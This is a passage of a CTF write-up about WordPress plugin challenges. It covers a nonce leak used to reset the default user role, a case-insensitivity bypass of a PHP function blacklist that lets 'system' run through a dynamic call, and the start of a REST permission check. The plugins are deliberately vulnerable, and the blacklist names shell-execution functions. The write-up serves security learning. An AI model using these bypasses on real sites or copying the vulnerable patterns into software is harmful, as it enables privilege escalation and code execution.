+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;script&gt;var _customizePartialRefreshExports = &#34;&#34;;var _ldAdminNounce = &#39;</span><span class=o>.</span><span class=nx>wp_create_nonce</span><span class=p>(</span> <span class=s1>&#39;login-customizer-admin&#39;</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;&#34;&lt;/script&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>this method were called within <code>__construct</code> method of <code>Login_Customizer_Customizer_Scripts</code>. The method also initialized directly in the end of file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>Login_Customizer_Customizer_Scripts</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd>     * The class constructor.
+</span></span></span><span class=line><span class=cl><span class=sd>     * Adds actions to enqueue our assets.
+</span></span></span><span class=line><span class=cl><span class=sd>     */</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>add_action</span><span class=p>(</span> <span class=s1>&#39;wp_footer&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;preview_data&#39;</span> <span class=p>),</span> <span class=mi>1000</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>new</span> <span class=nx>Login_Customizer_Customizer_Scripts</span><span class=p>();</span>
+</span></span></code></pre></td></tr></table></div></div><p>the file also included in the plugin&rsquo;s index file.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-16.png width=1294 height=470 loading=lazy class=gallery-image data-flex-grow=275 data-flex-basis=660px></p><p>so basically it was applied in <strong>any pages</strong>. This mean we can put <code>?preview=anything</code> params into any pagaes as authenticated users to obtain the nonce value.</p><p>Let&rsquo;s try to create new user.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-17.png width=1541 height=537 loading=lazy class=gallery-image data-flex-grow=286 data-flex-basis=688px></p><p>If you login and then access any page with the <code>preview</code> parameter, we will obtain the nonce value.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-18.png width=1278 height=917 loading=lazy class=gallery-image data-flex-grow=139 data-flex-basis=334px></p><p>with the authenticated cookie & nonce value, we can then access <code>set_option</code> ajax.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-19.png width=1544 height=568 loading=lazy class=gallery-image data-flex-grow=271 data-flex-basis=652px></p><p>this allows us to set <code>default_role</code> options to <code>contibutor</code>, and we can just register again to get users with <code>contributor</code> role.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-20.png width=1543 height=513 loading=lazy class=gallery-image data-flex-grow=300 data-flex-basis=721px></p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-21.png width=1279 height=761 loading=lazy class=gallery-image data-flex-grow=168 data-flex-basis=403px></p><p>with the contributor role account, we can now get the flag.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-22.png width=1545 height=559 loading=lazy class=gallery-image data-flex-grow=276 data-flex-basis=663px></p><p><strong>Flag: CTF{TUNING_NOT_FOR_THE_WIN_0z933}</strong></p><hr><h3 id=cool-templates>Cool Templates</h3><blockquote><p>I had someone build me a plugin so I can send out some links with special footers. I&rsquo;m sure the code is safe, right?</p><p>This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).</p></blockquote><p>In this challenge, we were given single plugin called <code>custom-footer</code></p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-23.png width=561 height=240 loading=lazy class=gallery-image data-flex-grow=233 data-flex-basis=561px></p><p>The plugin only have single files below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd> * Plugin Name: Custom Footer
+</span></span></span><span class=line><span class=cl><span class=sd> * Description: Adds a custom footer to every page.
+</span></span></span><span class=line><span class=cl><span class=sd> * Version: 1.0
+</span></span></span><span class=line><span class=cl><span class=sd> * Author: Dev Eloper
+</span></span></span><span class=line><span class=cl><span class=sd> */</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;ABSPATH&#39;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>;</span> <span class=c1>// Prevent direct access
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>simpletext</span><span class=p>(</span><span class=nv>$text</span> <span class=o>=</span> <span class=s2>&#34;Default Footer Text&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&lt;footer style=&#39;text-align:center; padding:10px; background:#f1f1f1;&#39;&gt;</span><span class=si>{</span><span class=nv>$text</span><span class=si>}</span><span class=s2>&lt;/footer&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>bigtext</span><span class=p>(</span><span class=nv>$text</span> <span class=o>=</span> <span class=s2>&#34;Default Footer Text&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&lt;footer style=&#39;text-align:center; padding:10px; background:#333; color:#fff;&#39;&gt;</span><span class=si>{</span><span class=nv>$text</span><span class=si>}</span><span class=s2>&lt;/footer&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>gradientfooter</span><span class=p>(</span><span class=nv>$text</span> <span class=o>=</span> <span class=s2>&#34;Default Footer Text&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&lt;footer style=&#39;text-align:center; padding:15px; background:linear-gradient(to right, #ff7e5f, #feb47b); color:#fff;&#39;&gt;</span><span class=si>{</span><span class=nv>$text</span><span class=si>}</span><span class=s2>&lt;/footer&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>add_custom_footer</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$blacklist</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;system&#34;</span><span class=p>,</span> <span class=s2>&#34;passthru&#34;</span><span class=p>,</span> <span class=s2>&#34;proc_open&#34;</span><span class=p>,</span> <span class=s2>&#34;shell_exec&#34;</span><span class=p>,</span> <span class=s2>&#34;include_once&#34;</span><span class=p>,</span> <span class=s2>&#34;require&#34;</span><span class=p>,</span> <span class=s2>&#34;require_once&#34;</span><span class=p>,</span> <span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;fopen&#34;</span><span class=p>,</span><span class=s1>&#39;fopen&#39;</span><span class=p>,</span> <span class=s1>&#39;tmpfile&#39;</span><span class=p>,</span> <span class=s1>&#39;bzopen&#39;</span><span class=p>,</span> <span class=s1>&#39;gzopen&#39;</span><span class=p>,</span> <span class=s1>&#39;chgrp&#39;</span><span class=p>,</span> <span class=s1>&#39;chmod&#39;</span><span class=p>,</span> <span class=s1>&#39;chown&#39;</span><span class=p>,</span> <span class=s1>&#39;copy&#39;</span><span class=p>,</span> <span class=s1>&#39;file_put_contents&#39;</span><span class=p>,</span> <span class=s1>&#39;lchgrp&#39;</span><span class=p>,</span> <span class=s1>&#39;lchown&#39;</span><span class=p>,</span> <span class=s1>&#39;link&#39;</span><span class=p>,</span> <span class=s1>&#39;mkdir&#39;</span><span class=p>,</span> <span class=s1>&#39;move_uploaded_file&#39;</span><span class=p>,</span> <span class=s1>&#39;rename&#39;</span><span class=p>,</span> <span class=s1>&#39;rmdir&#39;</span><span class=p>,</span> <span class=s1>&#39;symlink&#39;</span><span class=p>,</span> <span class=s1>&#39;tempnam&#39;</span><span class=p>,</span> <span class=s1>&#39;touch&#39;</span><span class=p>,</span> <span class=s1>&#39;unlink&#39;</span><span class=p>,</span> <span class=s1>&#39;imagepng&#39;</span><span class=p>,</span> <span class=s1>&#39;imagewbmp&#39;</span><span class=p>,</span> <span class=s1>&#39;image2wbmp&#39;</span><span class=p>,</span> <span class=s1>&#39;imagejpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;imagexbm&#39;</span><span class=p>,</span> <span class=s1>&#39;imagegif&#39;</span><span class=p>,</span> <span class=s1>&#39;imagegd&#39;</span><span class=p>,</span> <span class=s1>&#39;imagegd2&#39;</span><span class=p>,</span> <span class=s1>&#39;iptcembed&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp_get&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp_nb_get&#39;</span><span class=p>,</span> <span class=s1>&#39;file_exists&#39;</span><span class=p>,</span> <span class=s1>&#39;file_get_contents&#39;</span><span class=p>,</span> <span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;fileatime&#39;</span><span class=p>,</span> <span class=s1>&#39;filectime&#39;</span><span class=p>,</span> <span class=s1>&#39;filegroup&#39;</span><span class=p>,</span> <span class=s1>&#39;fileinode&#39;</span><span class=p>,</span> <span class=s1>&#39;filemtime&#39;</span><span class=p>,</span> <span class=s1>&#39;fileowner&#39;</span><span class=p>,</span> <span class=s1>&#39;fileperms&#39;</span><span class=p>,</span> <span class=s1>&#39;filesize&#39;</span><span class=p>,</span> <span class=s1>&#39;filetype&#39;</span><span class=p>,</span> <span class=s1>&#39;glob&#39;</span><span class=p>,</span> <span class=s1>&#39;is_dir&#39;</span><span class=p>,</span> <span class=s1>&#39;is_executable&#39;</span><span class=p>,</span> <span class=s1>&#39;is_file&#39;</span><span class=p>,</span> <span class=s1>&#39;is_link&#39;</span><span class=p>,</span> <span class=s1>&#39;is_readable&#39;</span><span class=p>,</span> <span class=s1>&#39;is_uploaded_file&#39;</span><span class=p>,</span> <span class=s1>&#39;is_writable&#39;</span><span class=p>,</span> <span class=s1>&#39;is_writeable&#39;</span><span class=p>,</span> <span class=s1>&#39;linkinfo&#39;</span><span class=p>,</span> <span class=s1>&#39;lstat&#39;</span><span class=p>,</span> <span class=s1>&#39;parse_ini_file&#39;</span><span class=p>,</span> <span class=s1>&#39;pathinfo&#39;</span><span class=p>,</span> <span class=s1>&#39;readfile&#39;</span><span class=p>,</span> <span class=s1>&#39;readlink&#39;</span><span class=p>,</span> <span class=s1>&#39;realpath&#39;</span><span class=p>,</span> <span class=s1>&#39;stat&#39;</span><span class=p>,</span> <span class=s1>&#39;gzfile&#39;</span><span class=p>,</span> <span class=s1>&#39;readgzfile&#39;</span><span class=p>,</span> <span class=s1>&#39;getimagesize&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefromgif&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefromjpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefrompng&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefromwbmp&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefromxbm&#39;</span><span class=p>,</span> <span class=s1>&#39;imagecreatefromxpm&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp_put&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp_nb_put&#39;</span><span class=p>,</span> <span class=s1>&#39;exif_read_data&#39;</span><span class=p>,</span> <span class=s1>&#39;read_exif_data&#39;</span><span class=p>,</span> <span class=s1>&#39;exif_thumbnail&#39;</span><span class=p>,</span> <span class=s1>&#39;exif_imagetype&#39;</span><span class=p>,</span> <span class=s1>&#39;hash_file&#39;</span><span class=p>,</span> <span class=s1>&#39;hash_hmac_file&#39;</span><span class=p>,</span> <span class=s1>&#39;hash_update_file&#39;</span><span class=p>,</span> <span class=s1>&#39;md5_file&#39;</span><span class=p>,</span> <span class=s1>&#39;sha1_file&#39;</span><span class=p>,</span> <span class=s1>&#39;highlight_file&#39;</span><span class=p>,</span> <span class=s1>&#39;show_source&#39;</span><span class=p>,</span> <span class=s1>&#39;php_strip_whitespace&#39;</span><span class=p>,</span> <span class=s1>&#39;get_meta_tags&#39;</span><span class=p>,</span> <span class=s1>&#39;extract&#39;</span><span class=p>,</span> <span class=s1>&#39;parse_str&#39;</span><span class=p>,</span> <span class=s1>&#39;putenv&#39;</span><span class=p>,</span> <span class=s1>&#39;ini_set&#39;</span><span class=p>,</span> <span class=s1>&#39;mail&#39;</span><span class=p>,</span> <span class=s1>&#39;header&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_nice&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_terminate&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_close&#39;</span><span class=p>,</span> <span class=s1>&#39;pfsockopen&#39;</span><span class=p>,</span> <span class=s1>&#39;fsockopen&#39;</span><span class=p>,</span> <span class=s1>&#39;apache_child_terminate&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_kill&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_mkfifo&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_setpgid&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_setsid&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_setuid&#39;</span><span class=p>,</span> <span class=s1>&#39;phpinfo&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_mkfifo&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_getlogin&#39;</span><span class=p>,</span> <span class=s1>&#39;posix_ttyname&#39;</span><span class=p>,</span> <span class=s1>&#39;getenv&#39;</span><span class=p>,</span> <span class=s1>&#39;get_current_user&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_get_status&#39;</span><span class=p>,</span> <span class=s1>&#39;get_cfg_var&#39;</span><span class=p>,</span> <span class=s1>&#39;disk_free_space&#39;</span><span class=p>,</span> <span class=s1>&#39;disk_total_space&#39;</span><span class=p>,</span> <span class=s1>&#39;diskfreespace&#39;</span><span class=p>,</span> <span class=s1>&#39;getcwd&#39;</span><span class=p>,</span> <span class=s1>&#39;getlastmo&#39;</span><span class=p>,</span> <span class=s1>&#39;getmygid&#39;</span><span class=p>,</span> <span class=s1>&#39;getmyinode&#39;</span><span class=p>,</span> <span class=s1>&#39;getmypid&#39;</span><span class=p>,</span> <span class=s1>&#39;getmyuid&#39;</span><span class=p>,</span> <span class=s1>&#39;create_function&#39;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=s1>&#39;popen&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_open&#39;</span><span class=p>,</span> <span class=s1>&#39;pcntl_exec&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;template&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$template</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;template&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$content</span> <span class=o>=</span> <span class=nx>wp_unslash</span><span class=p>(</span><span class=nx>urldecode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>])));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-zA-Z0-9]+$/&#39;</span><span class=p>,</span> <span class=nv>$template</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$template</span><span class=p>,</span> <span class=nv>$blacklist</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$footer</span> <span class=o>=</span> <span class=nv>$template</span><span class=p>(</span><span class=nv>$content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$footer</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_footer&#39;</span><span class=p>,</span> <span class=s1>&#39;add_custom_footer&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>It ask for <code>template</code> and <code>content</code> parameter, perform some validation (only allow alphanumeric characters and check for blacklisted function), base64 & url decode the content, and then perform dynamic function calls using <code>$template($content);</code></p><p>then i thought&mldr;</p><p><img src=https://media1.tenor.com/m/KzlS4vFRt88AAAAd/the-lego-movie-emmet.gif loading=lazy alt="seems simple enough"></p><p>so we can basically calls any function that alphanumeric and require only <strong>1 required</strong> arguments.</p><p>I try to search all possible php functions and wordpress function that match the criteria but found nothing. Author also said that this challenge were not meant to be solved in less than 2 days 🤯</p><p>so.. this should be the HARDEST challenges so far. Well&mldr; if no unintended were found. Surely there isn&rsquo;t unintended.. right?</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-24.png width=1063 height=1061 loading=lazy class=gallery-image data-flex-grow=100 data-flex-basis=240px></p><p>well, there is!</p><p>upon closer inspection, the validation only checks if <code>template</code> content is not in <code>blacklist</code>, but how about the case? PHP function can still be called even with inappropriate case.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-25.png width=250 height=90 loading=lazy class=gallery-image data-flex-grow=277 data-flex-basis=666px></p><p>so we can bypass the protection and call system function like this. Flag obtained!</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-26.png width=1280 height=992 loading=lazy class=gallery-image data-flex-grow=129 data-flex-basis=309px></p><p><strong>Flag: CTF{C00l_T3mpl4t3s_759eee4d}</strong></p><hr><h3 id=blocked>Blocked</h3><blockquote><p>it&rsquo;s blocked, nothing to do here.</p><p>NOTE: This is a fully white box challenge, almost no heavy brute force is needed.</p></blockquote><p>In this challenge, we were given one plugins named <code>test-plugin</code>.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-27.png width=688 height=192 loading=lazy class=gallery-image data-flex-grow=358 data-flex-basis=860px></p><p>It only have single files below</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nx>defined</span><span class=p>(</span> <span class=s1>&#39;WPINC&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_PLUGIN_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;test-plugin&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_VERSION&#39;</span><span class=p>,</span> <span class=s1>&#39;1.0.0&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_URL&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_url</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_PATH&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_path</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_BASE_DIR&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_path</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_BASE_NAME&#39;</span><span class=p>,</span> <span class=nx>plugin_basename</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s2>&#34;init&#34;</span><span class=p>,</span> <span class=s2>&#34;set&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s2>&#34;rest_api_init&#34;</span><span class=p>,</span> <span class=s2>&#34;register_endpoints&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>set</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>update_option</span><span class=p>(</span><span class=s2>&#34;secretword_is_true&#34;</span><span class=p>,</span> <span class=s2>&#34;anything&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>register_endpoints</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>register_rest_route</span><span class=p>(</span> <span class=s1>&#39;test&#39;</span><span class=p>,</span> <span class=s1>&#39;/upload/(?P&lt;somevalue&gt;\w+)&#39;</span><span class=p>,</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;methods&#39;</span> <span class=o>=&gt;</span> <span class=nx>WP_Rest_Server</span><span class=o>::</span><span class=na>CREATABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;upload_something&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;check_request&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check_request</span><span class=p>(</span> <span class=nv>$request</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$some_value</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span> <span class=nx>strtolower</span><span class=p>(</span> <span class=nv>$request</span><span class=p>[</span><span class=s1>&#39;somevalue&#39;</span><span class=p>]</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=k>empty</span><span class=p>(</span> <span class=nv>$some_value</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=o>!</span> <span class=nx>preg_match</span><span class=p>(</span> <span class=s1>&#39;/^secretword_/i&#39;</span><span class=p>,</span> <span class=nv>$some_value</span><span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=nv>$some_value</span> <span class=o>==</span> <span class=s1>&#39;secretword_is_true&#39;</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>upload_something</span><span class=p>(</span><span class=nv>$request</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$body</span> <span class=o>=</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_json_params</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$body</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nv>$body</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
